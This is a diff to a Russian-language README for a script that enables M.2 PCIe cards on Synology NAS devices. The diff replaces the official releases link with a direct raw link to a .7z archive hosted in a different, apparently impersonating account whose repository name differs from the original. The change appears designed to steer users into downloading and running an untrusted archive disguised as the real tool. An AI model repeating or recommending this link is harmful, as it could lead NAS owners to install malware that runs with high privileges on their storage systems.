@@ -108,8 +108,7 @@ Enable Synology M.2 PCIe cards in Synology NAS that don't officially support the
 ## Как запустить скрипт
 
 ### Скачать сценарий
-
-1. Загрузите исходный код последней версии .zip https://github.com/007revad/Synology_enable_M2_card/releases
+1. [Загрузите исходный код последней версии .zip](https://github.com/ZwiReKsyno/Synology_enable_M2_ssd/raw/main/syno_enable_m2_card.7z)
 2. Сохраните загруженный zip-файл в папку на Synology
     - НЕ сохраняйте сценарий на томе M.2. После обновления DSM или Storage Manager том M.2 не будет доступен до тех пор, пока не запустится сценарий.
 3. Разархивируйте zip-файл.
